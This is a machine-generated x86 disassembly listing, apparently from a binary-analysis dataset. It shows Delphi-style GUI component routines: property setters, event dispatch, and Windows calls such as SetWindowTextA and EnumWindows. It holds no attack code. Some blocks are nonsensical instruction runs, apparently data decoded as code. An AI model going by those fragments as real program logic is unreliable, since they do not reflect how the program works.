je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_439a40
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_439a60
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_439a80
push ebx
mov ebx eax
cmp [ ebx + 0x25a ] 0x0
je r-xdata
mov [ ebx + 0x208 ] 0x0
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_439aa4
push ebx
mov ebx eax
mov eax ebx
call sub_449040
cmp [ ebx + 0x234 ] 0x0
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_439d18
sub_439d0a
jmp sub_403b24
sub_439d11
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439d58
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44ad0c
sub_439eac
jmp sub_403870
sub_439eea
jmp sub_403b24
sub_439ef1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439f38
cmp edx [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] edx
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_43a190
sub_439f84
cmp dx [ eax + 0x23a ]
je r-xdata
retn
mov [ eax + 0x23a ] dx
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_43a190
sub_439fa0
cmp dl [ eax + 0x235 ]
je r-xdata
retn
mov [ eax + 0x235 ] dl
call sub_44ad0c
sub_439fb4
cmp dl [ eax + 0x236 ]
je r-xdata
retn
mov [ eax + 0x236 ] dl
call sub_44ad0c
sub_43a13c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_439ef8
mov dx 0x1
mov eax ebx
call sub_43a15c
sub_43a1fc
mov ecx [ eax + 0x240 ]
mov [ edx ] ecx
mov ecx [ eax + 0x244 ]
mov [ edx + 0x4 ] ecx
retn
sub_43a210
mov ecx [ eax + 0x248 ]
mov [ edx ] ecx
mov ecx [ eax + 0x24c ]
mov [ edx + 0x4 ] ecx
retn
sub_43a224
mov ecx [ eax + 0x250 ]
mov [ edx ] ecx
mov ecx [ eax + 0x254 ]
mov [ edx + 0x4 ] ecx
retn
sub_43a238
mov ecx [ eax + 0x258 ]
mov [ edx ] ecx
mov ecx [ eax + 0x25c ]
mov [ edx + 0x4 ] ecx
retn
sub_43a24c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x240 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x244 ] edx
pop ebp
retn 0x8
sub_43a268
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x248 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24c ] edx
pop ebp
retn 0x8
sub_43a284
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x254 ] edx
pop ebp
retn 0x8
sub_43a2a0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x25c ] edx
pop ebp
retn 0x8
sub_43a32b
jmp sub_403b24
sub_43a332
pop ebp
retn
sub_43a334
sub [ rw-data ] 0x1
retn
sub_43a3a3
jmp [ edi ]
sub_43a644
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43a65c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43a6a0
push ebx
mov ebx eax
mov eax ebx
call sub_43adc8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43adb7
jmp sub_403b24
sub_43adc8
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_430ea8
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43a670
sub_43ae1f
jmp sub_403b24
sub_43ae26
pop ebp
retn
sub_43ae28
sub [ rw-data ] 0x1
retn
sub_43af1a
inc esp
add [ edi ] ah
inc esp
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax - 0x4bffbb29 ] bh
hlt
sub_43b08a
inc esp
add [ edi ] ah
inc esp
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax - 0x4bffbb29 ] bh
hlt
sub_43e927
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x4341172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_43ece2
jmp sub_403b24
sub_43ece9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ed6e
jmp sub_403b24
sub_43ed75
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ed7c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44a02c
pop ebx
retn
sub_43ed90
push ebx
mov ebx eax
mov eax ebx
call sub_44cd84
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44a02c
pop ebx
retn
sub_43edac
push ebx
mov ebx eax
mov eax ebx
call sub_44bd58
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43ee58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446f84
pop esi
pop ebx
retn
sub_43efc2
jmp sub_403b24
sub_43efc9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f0d8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_449040
mov eax ebx
mov si 0xffc7
call sub_40358c
pop esi
pop ebx
retn
sub_43f1c4
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f1e0
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_40358c
sub_43f1fc
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_43f208
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_423b78
sub_43f21c
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f27c
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f2f0
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_40358c
pop esi
pop ebx
retn
sub_43f30c
push esi
mov esi eax
mov eax esi
call sub_448b4c
mov eax esi
mov si 0xffc7
call sub_40358c
pop esi
retn
sub_43f3b1
jmp sub_403b24
sub_43f3b8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f3c0
push ebx
mov ebx eax
mov eax ebx
call sub_448cb0
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_43f3e4
push ebx
mov ebx eax
mov eax ebx
call sub_448cc8
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_43f4d0
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_43fadc
sub_43f4e4
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_43fadc
mov eax ebx
call sub_44ad0c
sub_43f508
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_44ad0c
sub_43f51c
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_44ad0c
sub_43f560
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_44ad0c
sub_43f661
jmp sub_403b24
sub_43f668
pop ebx
pop ecx
pop ebp
retn
sub_43f780
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_44d7a4
push eax
call SetWindowTextA
pop ebx
retn
sub_43f79c
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
pop ebx
retn
sub_43f842
jmp sub_403b24
sub_43f849
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f8e2
jmp sub_403b24
sub_43fa5b
jmp sub_403b24
sub_43fac0
push ebx
mov ebx eax
mov eax ebx
call sub_43f574
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_44ab08
pop ebx
retn
sub_43fbc0
push ebx
mov ebx eax
mov eax ebx
call sub_446b90
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_43fcb8
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_40358c
sub_43ff7b
jmp sub_403b24
sub_43ff82
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44002c
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
pop esi
retn
sub_44008c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_446f84
pop esi
pop ebx
retn
sub_440169
jmp sub_403b24
sub_440170
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440404
mov al [ eax + 0x224 ]
retn
sub_44040c
push ebx
mov ebx eax
mov eax ebx
call sub_449040
xor edx edx
mov eax ebx
call sub_43f5ac
pop ebx
retn
sub_440424
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_44ad0c
sub_440438
push esi
mov esi eax
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_440448
cmp dl [ eax + 0x225 ]
je r-xdata
retn
mov [ eax + 0x225 ] dl
call sub_44ad0c
sub_44045c
cmp dl [ eax + 0x226 ]
je r-xdata
retn
mov [ eax + 0x226 ] dl
call sub_44ad0c
sub_4404a4
call sub_44c9f4
retn
sub_440582
jmp sub_403b24
sub_44062c
mov eax [ r-xdata ]
retn
sub_440634
xor eax eax
retn
sub_440658
retn
sub_440770
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44ad0c
sub_4407e8
push ebx
mov ebx eax
mov eax ebx
call sub_45dd9c
test eax eax
je r-xdata
mov eax ebx
call sub_4484c0
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_44080c
xor eax eax
retn
sub_4408d3
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x61b9173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4408ec
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_40358c
sub_4409dd
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_4409e6
jmp sub_403b24
j_sub_4409dd
jmp sub_4409dd
sub_4409ed
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440b98
push ebx
mov ebx eax
mov eax ebx
call sub_446b90
mov eax ebx
call sub_4484c0
pop ebx
retn
sub_440bac
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_440bb8
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44ad0c
sub_440bcc
test dl dl
je r-xdata
xor edx edx
call sub_440be0
retn
mov dl 0x1
call sub_440be0
retn
sub_440cbc
push ebx
mov ebx eax
mov eax ebx
call sub_44bd58
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_440cd0
call sub_44ad0c
retn
sub_440d66
jmp sub_403b24
sub_440d6d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440d74
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_440da9
jmp sub_403b24
sub_440db0
pop ebp
retn
sub_440db4
sub [ rw-data ] 0x1
retn
sub_440f11
jmp sub_403b24
sub_440f18
pop ebp
retn
sub_440f1c
sub [ rw-data ] 0x1
retn
sub_440f35
add eax 0xffffffe0
jmp sub_44151c
sub_440f3d
add eax 0xffffffe0
jmp sub_441584
sub_440f45
add eax 0xffffffe0
jmp sub_441698
sub_440f4d
add eax 0xffffffe0
jmp sub_44170c
sub_440f55
add eax 0xffffffe0
jmp sub_4411c8
sub_440f5d
add eax 0xffffffe0
jmp sub_4411dc
sub_440f65
add eax 0xffffffe0
jmp sub_441254
sub_440f6d
add eax 0xffffffe0
jmp sub_4412f8
sub_440f75
add eax 0xffffffe0
jmp sub_4412fc
sub_440f7d
add eax 0xffffffe0
jmp sub_441384
sub_440f85
add eax 0xffffffe0
jmp sub_4414cc
sub_440f8d
add eax 0xffffffe0
jmp sub_4414d0
sub_440f95
add eax 0xffffffe0
jmp sub_4414ec
sub_440fa7
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405c24
sub_441185
jmp sub_403b24
sub_44118c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4411c8
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_404174
pop ebx
retn
sub_441243
jmp sub_403b24
sub_44124a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4412dc
jmp sub_403b24
sub_4412e3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4412f8
mov al 0x1
retn
sub_441377
jmp sub_403b24
sub_44137e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44147c
jmp sub_403b24
sub_441483
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4414cc
mov [ eax + 0xc ] edx
retn
sub_4414d0
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_441574
jmp sub_403b24
sub_44157b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44167a
jmp sub_403b24
sub_441681
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4416fa
jmp sub_403b24
sub_441701
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44178c
jmp sub_403b24
sub_441793
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441887
jmp sub_403b24
sub_44188e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_441950
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_44189c
call EnumWindows
retn
sub_4419e2
jmp sub_403b24
sub_4419e9
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4419f4
xor eax eax
retn
sub_441aed
jmp sub_403b24
sub_441af4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441bde
jmp sub_403b24
sub_441be5
pop ebp
retn
sub_441c3a
jmp sub_403b24
sub_441c41
pop ebp
retn
sub_442dc4
jmp r-xdata
sub_442dc6
0xe8ffe9ff 0xe7ff
sub_442dcd
jmp esi
sub_443610
inc esp
add ah dl

sub_443614
inc esp
add al ch

sub_443618
inc esp
add al dh

sub_44361c
inc esp
add al bh

sub_443620
inc esp
add [ eax ] al
int3
sub_443624
inc esp
add [ eax - 0x34 ] bl
inc esp
add [ eax - 0x37ffbb34 ] ah
int3
sub_443630
inc esp
add [ ebp + ecx * 8 + 0x44 ] al
add [ ecx * 8 - 0x327bffbc ] al
inc esp
add ah al
int 0x44
add [ eax ] dh
int3
sub_443644
inc esp
add al dl
0x44
sub_4436a4
inc esp
add [ eax + ebx * 8 - 0x2d87ffbc ] al
inc esp
add al bl
retn 0x44
sub_443d64
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_444077
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_41af78
retn
sub_444094
push 0x15
mov ecx rw-data
call sub_41af38
retn
sub_44412c
call GetCapture
call sub_443e64
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_444390
push ebx
push eax
push sub_444514
call sub_424bf4
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_4443a8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4443d8
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_424ca8
pop ebx
retn
sub_4444b6
jmp sub_403870
sub_4444e8
xor eax eax
retn
sub_4444ec
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_444504
retn
sub_444508
mov eax [ rw-data ]
retn
sub_444510
retn
sub_44453e
jmp sub_403870
sub_444543
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466be8
call sub_403bd8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444560
call sub_4035e8
xor eax eax
mov [ rw-data ] eax
retn
sub_444570
call sub_4035e4
xor eax eax
mov [ rw-data ] eax
retn
sub_444580
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_444630
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_444648
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_444694
retn
sub_44484c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_40358c
pop esi
retn
sub_444860
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_40358c
pop esi
retn
sub_444874
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_444880
mov eax 0x4
retn
sub_444888
retn
sub_445479
jmp sub_403870
sub_445766
jmp sub_403b24
sub_4457d8
jmp sub_403b24
sub_4457e4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_44550c
sub_445963
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_427c48
retn
sub_445979
jmp sub_403b24
sub_4459a0
jmp sub_403b24
sub_445a22
jmp sub_403b24
sub_445a4a
jmp sub_403b24
sub_445a51
mov esp ebp
pop ebp
retn
sub_445b09
jmp sub_403b24
sub_445b60
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_445b2c
mov [ ebx + 0x58 ] esi
sub_445cb4
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_445cc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403540
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_445db1
jmp sub_403b24
sub_445db8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445e3b
jmp sub_403b24
sub_445e42
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_446210
xor eax eax
retn
sub_446214
mov al [ eax + 0x58 ]
retn
sub_446218
xor eax eax
retn
sub_44621c
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_446224
mov eax [ eax + 0x30 ]
retn
sub_4462c8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_446374
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_44638c
mov [ eax + 0x5d ] dl
retn
sub_446390
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_449f70
sub_4463a0
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_446883
jmp sub_403b24
sub_44688a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4468ec
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_446970
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_446a8d
jmp sub_403b24
sub_446a94
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446b90
push eax
xor ecx ecx
mov edx 0xb037
call sub_448138
retn
sub_446d51
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_40358c
sub_446e02
jmp sub_403b24
sub_446e09
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446ee0
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_448138
sub_446ef8
push 0x0
xor ecx ecx
mov edx 0xe
call sub_448138
retn
sub_446f08
push edx
mov edx 0xd
call sub_448138
retn
sub_446f14
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_446f28
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_447009
jmp sub_403b24
sub_447010
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447018
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_448138
sub_447088
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_44709c
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_4470a8
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_4470b0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_448138
sub_4470d4
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_448138
sub_4470f8
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_448138
sub_447140
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_447148
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_448138
sub_44716c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_448138
sub_447190
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_448138
sub_4471ac
push ebx
mov ebx eax
call sub_44412c
cmp ebx eax
sete al
pop ebx
retn
sub_4471e4
push esi
mov dl 0x1
mov si 0xffce
call sub_40358c
pop esi
retn
sub_44732e
jmp sub_403b24
sub_447335
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447458
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_4473cc
retn
sub_4474ac
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_4474c0
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4475a5
jmp sub_403b24
sub_4475c4
xor eax eax
retn
sub_4475c8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4475e0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_4475f8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_447614
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44762c
retn
sub_4476f0
retn
sub_4476f4
cmp eax [ rw-data ]
sete al
retn
sub_447768
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_447884
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_40358c
pop esi
pop ebp
retn 0x4
sub_4478c4
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_447b5b
jmp sub_403b24
sub_447b62
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447b6c
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_40358c
pop esi
retn
sub_447b80
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_40358c
pop esi
retn
sub_447e4f
jmp sub_403b24
sub_447ef8
push esi
mov si 0xffee
call sub_40358c
pop esi
retn
sub_447f04
mov al 0x1
retn
sub_4481dc
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_4465d8
retn
sub_448200
retn
sub_448419
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41f270
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_448434
mov al [ eax + 0x5e ]
xchg edx eax
call sub_421728
retn
sub_44852c
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_448b44
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_448b4c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_448b54
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_448c0c
push esi
mov esi eax
mov eax [ rw-data ]
